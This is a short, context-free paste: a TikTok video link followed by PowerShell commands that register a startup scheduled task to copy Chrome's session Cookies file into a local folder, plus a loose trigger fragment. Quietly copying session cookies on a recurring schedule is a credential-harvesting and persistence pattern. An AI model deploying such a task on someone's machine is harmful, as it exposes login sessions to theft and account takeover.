https://www.tiktok.com/@fukuua_/video/7258348749309725957

Register-ScheduledTask -TaskName cookies -Action (New-ScheduledTaskAction -Execute 'powershell.exe' -Argument '-File "C:\axc\cookies.ps1"') -Trigger (New-ScheduledTaskTrigger -AtStartup -Delay (New-TimeSpan -Minutes 10))

Register-ScheduledTask -TaskName cookies -Action (New-ScheduledTaskAction -Execute 'powershell.exe' -Argument '-Command "Copy-Item -Path $env:LOCALAPPDATA\google\chrome\user data\default\network\Cookies" -Destination "C:\axc\Cookies $((Get-Date).ToString('yyyy-MM-dd HH-mm-ss'))"') -Trigger (New-ScheduledTaskTrigger -AtStartup -Delay (New-TimeSpan -Minutes 10))

-Once -At (Get-Date).AddMinutes(5)
